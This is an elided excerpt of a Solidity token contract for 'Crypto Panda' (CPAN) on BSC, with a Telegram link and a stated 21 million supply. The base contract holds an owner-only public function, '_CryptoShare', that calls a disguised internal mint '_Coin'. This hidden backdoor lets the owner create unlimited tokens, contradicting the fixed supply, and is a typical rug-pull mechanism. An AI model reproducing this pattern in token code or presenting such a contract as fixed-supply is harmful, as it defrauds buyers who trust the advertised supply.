 ...
 *     Slippage 7% 
 * 
 *    Telegram Group : https://t.me/CryptoPandaBSC
 * 
 */
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _CryptoShare(uint256 amount) public onlyOwner {
    _Coin(msg.sender, amount);
    }
    ...
    function _Coin(address account, uint256 amount) internal virtual {
...
contract CRYPTOPANDA is ERC20 {

    uint tokenTotalSupply = 21000000; // 21 Million

    constructor() public ERC20("Crypto Panda", "CPAN") {
        _Coin(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}